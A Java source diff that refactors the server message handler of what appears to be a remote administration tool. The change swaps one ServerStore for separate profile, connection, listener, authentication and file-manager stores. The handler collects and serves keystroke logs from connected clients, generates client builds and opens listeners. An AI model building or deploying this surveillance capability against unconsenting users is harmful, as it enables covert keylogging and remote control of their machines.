@@ -69,6 +69,7 @@ import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Users.RQ_AddUser;
 import com.subterranean_security.crimson.core.proto.Users.RS_AddUser;
 import com.subterranean_security.crimson.core.proto.Users.RS_EditUser;
+import com.subterranean_security.crimson.core.store.FileManagerStore;
 import com.subterranean_security.crimson.core.stream.StreamStore;
 import com.subterranean_security.crimson.core.stream.subscriber.SubscriberSlave;
 import com.subterranean_security.crimson.core.util.CryptoUtil;
@@ -79,9 +80,10 @@ import com.subterranean_security.crimson.core.util.Validation;
 import com.subterranean_security.crimson.sc.Logsystem;
 import com.subterranean_security.crimson.server.Generator;
 import com.subterranean_security.crimson.server.ServerState;
-import com.subterranean_security.crimson.server.ServerStore;
-import com.subterranean_security.crimson.server.ServerStore.Connections;
-import com.subterranean_security.crimson.server.ServerStore.Profiles;
+import com.subterranean_security.crimson.server.store.Authentication;
+import com.subterranean_security.crimson.server.store.ConnectionStore;
+import com.subterranean_security.crimson.server.store.ListenerStore;
+import com.subterranean_security.crimson.server.store.ProfileStore;
 import com.subterranean_security.crimson.server.stream.SInfoSlave;
 import com.subterranean_security.crimson.sv.net.Listener;
 import com.subterranean_security.crimson.sv.permissions.Perm;
@@ -118,7 +120,7 @@ public class ServerExecutor extends BasicExecutor {
 						if (m.hasRid() && m.getRid() != 0) {
 							// route
 							try {
-								ServerStore.Connections.getConnection(m.getRid()).handle.write(m);
+								ConnectionStore.getConnection(m.getRid()).handle.write(m);
 							} catch (NullPointerException e) {
 								log.debug("Could not forward message to CVID: {}", m.getRid());
 								receptor.handle.write(Message.newBuilder()
@@ -193,7 +195,7 @@ public class ServerExecutor extends BasicExecutor {
 
 	private void ev_kevent(Message m) {
 		try {
-			ServerStore.Profiles.getClient(receptor.getCvid()).getKeylog().addEvent(m.getEvKevent());
+			ProfileStore.getClient(receptor.getCvid()).getKeylog().addEvent(m.getEvKevent());
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -232,14 +234,14 @@ public class ServerExecutor extends BasicExecutor {
 			pd = EV_ProfileDelta.newBuilder(pd).setCvid(receptor.getCvid()).build();
 		}
 
-		ServerStore.Profiles.getClient(receptor.getCvid()).amalgamate(pd);
-		Connections.sendToViewersWithAuthorityOverClient(receptor.getCvid(), Perm.client.visibility,
+		ProfileStore.getClient(receptor.getCvid()).amalgamate(pd);
+		ConnectionStore.sendToViewersWithAuthorityOverClient(receptor.getCvid(), Perm.client.visibility,
 				Message.newBuilder().setEvProfileDelta(pd));
 	}
 
 	private void mi_trigger_profile_delta(Message m) {
 
-		for (ClientProfile cp : ServerStore.Profiles.getClientsUnderAuthority(receptor.getCvid())) {
+		for (ClientProfile cp : ProfileStore.getClientsUnderAuthority(receptor.getCvid())) {
 			boolean flag = true;
 			for (ProfileTimestamp pt : m.getMiTriggerProfileDelta().getProfileTimestampList()) {
 				if (pt.getCvid() == cp.getCid()) {
@@ -289,13 +291,13 @@ public class ServerExecutor extends BasicExecutor {
 		switch (auth.getType()) {
 
 		case GROUP:
-			final AuthenticationGroup group = ServerStore.Authentication.getGroup(auth.getGroupName());
+			final AuthenticationGroup group = Authentication.getGroup(auth.getGroupName());
 			if (group == null) {
 				log.debug("Authentication failed: Invalid Group: {}", auth.getGroupName());
 				receptor.setState(ConnectionState.CONNECTED);
 				return;
 			} else {
-				authID = ServerStore.Authentication.getGroupMethod(auth.getGroupName()).getId();
+				authID = Authentication.getGroupMethod(auth.getGroupName()).getId();
 			}
 			final int mSeqID = IDGen.msg();
 
@@ -328,7 +330,7 @@ public class ServerExecutor extends BasicExecutor {
 			break;
 
 		case PASSWORD:
-			AuthMethod am = ServerStore.Authentication.getPassword(auth.getPassword());
+			AuthMethod am = Authentication.getPassword(auth.getPassword());
 			if (am == null) {
 				log.debug("Password authentication failed");
 				receptor.setState(ConnectionState.CONNECTED);
@@ -370,14 +372,14 @@ public class ServerExecutor extends BasicExecutor {
 		Date target = new Date(rq.getStartDate());
 
 		// check permissions
-		if (!Profiles.getViewer(receptor.getCvid()).getPermissions().getFlag(rq.getCid(),
+		if (!ProfileStore.getViewer(receptor.getCvid()).getPermissions().getFlag(rq.getCid(),
 				Perm.client.keylogger.read_logs)) {
 			receptor.handle.write(Message.newBuilder().setId(m.getId())
 					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
 			return;
 		}
 
-		ClientProfile cp = ServerStore.Profiles.getClient(rq.getCid());
+		ClientProfile cp = ProfileStore.getClient(rq.getCid());
 		if (cp != null) {
 			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
 				receptor.handle.write(Message.newBuilder().setSid(rq.getCid()).setEvKevent(k).build());
@@ -396,7 +398,7 @@ public class ServerExecutor extends BasicExecutor {
 			return;
 		}
 		RQ_GroupChallenge rq = m.getRqGroupChallenge();
-		AuthenticationGroup group = ServerStore.Authentication.getGroup(rq.getGroupName());
+		AuthenticationGroup group = Authentication.getGroup(rq.getGroupName());
 
 		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder()
 				.setResult(CryptoUtil.signGroupChallenge(rq.getMagic(), group.getPrivateKey())).build();
@@ -414,7 +416,7 @@ public class ServerExecutor extends BasicExecutor {
 		receptor.setInstance(Universal.Instance.VIEWER);
 
 		String user = m.getRqLogin().getUsername();
-		ViewerProfile vp = ServerStore.Profiles.getViewer(user);
+		ViewerProfile vp = ProfileStore.getViewer(user);
 		EV_ServerProfileDelta.Builder sid = EV_ServerProfileDelta.newBuilder();
 		EV_ViewerProfileDelta.Builder vid = EV_ViewerProfileDelta.newBuilder();
 
@@ -426,7 +428,7 @@ public class ServerExecutor extends BasicExecutor {
 				vp = new ViewerProfile(IDGen.cvid());
 				vp.setUser(user);
 				vp.getPermissions().addFlag(Perm.server.generator.generate).addFlag(Perm.server.fs.read);
-				ServerStore.Profiles.addViewer(vp);
+				ProfileStore.addViewer(vp);
 			}
 
 		}
@@ -480,7 +482,7 @@ public class ServerExecutor extends BasicExecutor {
 			if (pass) {
 				receptor.setState(ConnectionState.AUTHENTICATED);
 
-				ServerStore.Connections.add(receptor);
+				ConnectionStore.add(receptor);
 
 				vp.setIp(receptor.getRemoteAddress());
 				vid.setUser(vp.getUser());
@@ -495,14 +497,14 @@ public class ServerExecutor extends BasicExecutor {
 					vid.setLastLoginTime(vp.getLastLoginTime().getTime());
 				}
 
-				for (Listener l : ServerStore.Listeners.listeners) {
+				for (Listener l : ListenerStore.listeners) {
 					sid.addListener(l.getConfig());
 				}
 
 				try {
-					for (Integer i : ServerStore.Profiles.getViewerKeyset()) {
+					for (Integer i : ProfileStore.getViewerKeyset()) {
 
-						ViewerProfile vpi = ServerStore.Profiles.getViewer(i);
+						ViewerProfile vpi = ProfileStore.getViewer(i);
 						if (vpi.getUser().equals(user)) {
 							// skip the user logging in
 							continue;
@@ -520,7 +522,7 @@ public class ServerExecutor extends BasicExecutor {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
-				sid.setServerStatus(ServerStore.Listeners.isRunning());
+				sid.setServerStatus(ListenerStore.isRunning());
 			}
 
 		} finally {
@@ -538,7 +540,7 @@ public class ServerExecutor extends BasicExecutor {
 	private void rq_generate(Message m) {
 
 		// check permissions
-		if (!Profiles.getViewer(receptor.getCvid()).getPermissions().getFlag(Perm.server.generator.generate)) {
+		if (!ProfileStore.getViewer(receptor.getCvid()).getPermissions().getFlag(Perm.server.generator.generate)) {
 			receptor.handle.write(Message.newBuilder().setId(m.getId())
 					.setRsGenerate(RS_Generate.newBuilder()
 							.setReport(GenReport.newBuilder().setResult(false).setComment("Insufficient permissions")))
@@ -561,7 +563,7 @@ public class ServerExecutor extends BasicExecutor {
 					.setReport(g.getReport());
 
 			if (m.getRqGenerate().hasSendToCid()) {
-				ServerStore.Connections.getConnection(m.getRqGenerate().getSendToCid()).handle
+				ConnectionStore.getConnection(m.getRqGenerate().getSendToCid()).handle
 						.write(Message.newBuilder().setRsGenerate(rs).build());
 				receptor.handle.write(Message.newBuilder().setId(m.getId())
 						.setRsGenerate(RS_Generate.newBuilder().setReport(g.getReport())).build());
@@ -576,7 +578,7 @@ public class ServerExecutor extends BasicExecutor {
 	}
 
 	private void rq_file_listing(Message m) {
-		ViewerProfile vp = ServerStore.Profiles.getViewer(receptor.getCvid());
+		ViewerProfile vp = ProfileStore.getViewer(receptor.getCvid());
 
 		if (!vp.getPermissions().getFlag(Perm.server.fs.read)) {
 			log.warn("Denied unauthorized file access to server from viewer: {}", receptor.getCvid());
@@ -584,7 +586,7 @@ public class ServerExecutor extends BasicExecutor {
 		}
 
 		RQ_FileListing rq = m.getRqFileListing();
-		LocalFS lf = ServerStore.LocalFilesystems.get(rq.getFmid());
+		LocalFS lf = FileManagerStore.get(rq.getFmid());
 		if (rq.hasUp() && rq.getUp()) {
 			lf.up();
 		} else if (rq.hasDown()) {
@@ -603,27 +605,26 @@ public class ServerExecutor extends BasicExecutor {
 
 	// TODO router?
 	private void rs_file_listing(Message m) {
-		Receptor r = ServerStore.Connections.getConnection(m.getSid());
+		Receptor r = ConnectionStore.getConnection(m.getSid());
 		r.handle.write(m);
 	}
 
 	private void rs_file_handle(Message m) {
 		log.debug("Got rs_file_handle for VID: " + m.getSid());
-		Receptor r = ServerStore.Connections.getConnection(m.getSid());
+		Receptor r = ConnectionStore.getConnection(m.getSid());
 		r.handle.write(m);
 
 	}
 
 	private void rq_file_handle(Message m) {
-		ViewerProfile vp = ServerStore.Profiles.getViewer(receptor.getCvid());
+		ViewerProfile vp = ProfileStore.getViewer(receptor.getCvid());
 
 		if (!vp.getPermissions().getFlag(Perm.server.fs.read)) {
 			log.warn("Denied unauthorized file access to server from viewer: {}", receptor.getCvid());
 			return;
 		}
 		receptor.handle.write(Message.newBuilder().setId(m.getId())
-				.setRsFileHandle(
-						RS_FileHandle.newBuilder().setFmid(ServerStore.LocalFilesystems.add(new LocalFS(true, true))))
+				.setRsFileHandle(RS_FileHandle.newBuilder().setFmid(FileManagerStore.add(new LocalFS(true, true))))
 				.build());
 
 	}
@@ -631,7 +632,7 @@ public class ServerExecutor extends BasicExecutor {
 	private void rq_delete(Message m) {
 
 		// check permissions
-		if (!Profiles.getViewer(receptor.getCvid()).getPermissions().getFlag(Perm.server.fs.write)) {
+		if (!ProfileStore.getViewer(receptor.getCvid()).getPermissions().getFlag(Perm.server.fs.write)) {
 			receptor.handle.write(Message.newBuilder().setId(m.getId())
 					.setRsDelete(RS_Delete.newBuilder()
 							.setOutcome(Outcome.newBuilder().setResult(false).setComment("Insufficient permissions")))
@@ -652,7 +653,7 @@ public class ServerExecutor extends BasicExecutor {
 
 	private void rq_add_listener(Message m) {
 		// check permissions
-		if (!Profiles.getViewer(receptor.getCvid()).getPermissions().getFlag(Perm.server.network.create_listener)) {
+		if (!ProfileStore.getViewer(receptor.getCvid()).getPermissions().getFlag(Perm.server.network.create_listener)) {
 			receptor.handle.write(Message.newBuilder().setId(m.getId())
 					.setRsAddListener(
 							RS_AddListener.newBuilder().setResult(false).setComment("Insufficient permissions"))
@@ -662,10 +663,10 @@ public class ServerExecutor extends BasicExecutor {
 
 		receptor.handle.write(Message.newBuilder().setId(m.getId())
 				.setRsAddListener(RS_AddListener.newBuilder().setResult(true)).build());
-		ServerStore.Listeners.listeners.add(new Listener(m.getRqAddListener().getConfig()));
+		ListenerStore.listeners.add(new Listener(m.getRqAddListener().getConfig()));
 		Message update = Message.newBuilder().setEvServerProfileDelta(
 				EV_ServerProfileDelta.newBuilder().addListener(m.getRqAddListener().getConfig())).build();
-		ServerStore.Connections.sendToAll(Universal.Instance.VIEWER, update);
+		ConnectionStore.sendToAll(Universal.Instance.VIEWER, update);
 
 	}
 
@@ -686,7 +687,7 @@ public class ServerExecutor extends BasicExecutor {
 						.addViewerUser(EV_ViewerProfileDelta.newBuilder().setUser(m.getRqAddUser().getUser())
 								.addAllViewerPermissions(m.getRqAddUser().getPermissionsList())))
 				.build();
-		ServerStore.Connections.sendToAll(Universal.Instance.VIEWER, update);
+		ConnectionStore.sendToAll(Universal.Instance.VIEWER, update);
 
 	}
 
@@ -700,7 +701,7 @@ public class ServerExecutor extends BasicExecutor {
 		ViewerProfile vp = null;
 
 		try {
-			vp = ServerStore.Profiles.getViewer(rqad.getUser());
+			vp = ProfileStore.getViewer(rqad.getUser());
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -723,7 +724,7 @@ public class ServerExecutor extends BasicExecutor {
 		Message update = Message.newBuilder()
 				.setEvServerProfileDelta(EV_ServerProfileDelta.newBuilder().addViewerUser(b)).build();
 
-		ServerStore.Connections.sendToAll(Universal.Instance.VIEWER, update);
+		ConnectionStore.sendToAll(Universal.Instance.VIEWER, update);
 
 	}
 
@@ -734,10 +735,10 @@ public class ServerExecutor extends BasicExecutor {
 
 		switch (m.getRqChangeServerState().getNewState()) {
 		case FUNCTIONING_OFF:
-			ServerStore.Listeners.stop();
+			ListenerStore.stop();
 			break;
 		case FUNCTIONING_ON:
-			ServerStore.Listeners.start();
+			ListenerStore.start();
 			break;
 		case RESTART:
 			break;
@@ -753,11 +754,9 @@ public class ServerExecutor extends BasicExecutor {
 				.newBuilder().setOutcome(Outcome.newBuilder().setResult(result).setComment(comment))).build());
 
 		// notify viewers
-		ServerStore.Connections.sendToAll(Universal.Instance.VIEWER,
-				Message.newBuilder()
-						.setEvServerProfileDelta(
-								EV_ServerProfileDelta.newBuilder().setServerStatus(ServerStore.Listeners.isRunning()))
-						.build());
+		ConnectionStore.sendToAll(Universal.Instance.VIEWER, Message.newBuilder()
+				.setEvServerProfileDelta(EV_ServerProfileDelta.newBuilder().setServerStatus(ListenerStore.isRunning()))
+				.build());
 	}
 
 	private void rq_change_client_state(Message m) {
@@ -765,7 +764,7 @@ public class ServerExecutor extends BasicExecutor {
 	}
 
 	private void rq_create_auth_method(Message m) {
-		Outcome outcome = ServerStore.Authentication.create(m.getRqCreateAuthMethod().getAuthMethod());
+		Outcome outcome = Authentication.create(m.getRqCreateAuthMethod().getAuthMethod());
 
 		receptor.handle.write(Message.newBuilder().setId(m.getId())
 				.setRsCreateAuthMethod(RS_CreateAuthMethod.newBuilder().setOutcome(outcome)).build());
@@ -773,7 +772,7 @@ public class ServerExecutor extends BasicExecutor {
 	}
 
 	private void rq_remove_auth_method(Message m) {
-		ServerStore.Authentication.remove(m.getRqRemoveAuthMethod().getId());
+		Authentication.remove(m.getRqRemoveAuthMethod().getId());
 		// TODO check if removed
 		receptor.handle.write(
 				Message.newBuilder().setRsRemoveAuthMethod(RS_RemoveAuthMethod.newBuilder().setResult(true)).build());
@@ -797,17 +796,17 @@ public class ServerExecutor extends BasicExecutor {
 		receptor.setInstance(Universal.Instance.CLIENT);
 
 		try {
-			if (ServerStore.Profiles.getClient(receptor.getCvid()) == null) {
-				ServerStore.Profiles.addClient(new ClientProfile(receptor.getCvid()));
+			if (ProfileStore.getClient(receptor.getCvid()) == null) {
+				ProfileStore.addClient(new ClientProfile(receptor.getCvid()));
 			}
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 
-		ServerStore.Profiles.getClient(receptor.getCvid()).setAuthID(authID);
+		ProfileStore.getClient(receptor.getCvid()).setAuthID(authID);
 
-		ServerStore.Connections.add(receptor);
+		ConnectionStore.add(receptor);
 	}
 
 }
